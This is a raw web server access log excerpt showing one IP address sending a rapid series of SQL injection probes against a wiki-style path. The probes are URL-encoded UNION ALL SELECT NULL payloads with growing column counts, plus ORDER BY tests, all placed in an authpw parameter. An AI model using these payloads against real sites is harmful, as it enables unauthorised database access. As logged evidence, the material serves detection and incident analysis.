45.227.254.4 - - [11/Jan/2022:14:54:46 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 9406 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:47 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 9413 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:47 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9420 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:48 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9427 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:49 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9434 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:49 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9441 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:50 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9448 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:51 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9455 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:52 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9462 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:52 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9469 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:53 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20ORDER%20BY%201%23 HTTP/1.1" 200 9390 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:54 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20ORDER%20BY%204300%23 HTTP/1.1" 200 9393 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:55 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 9403 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:55 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 9410 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:56 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9417 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
45.227.254.4 - - [11/Jan/2022:14:54:57 +0100] "GET /Aips2sqlite/Release?n=Main.SideBar%3Faction=edit&authid=1&authpw=1&authid=1&authpw=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 9424 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0"
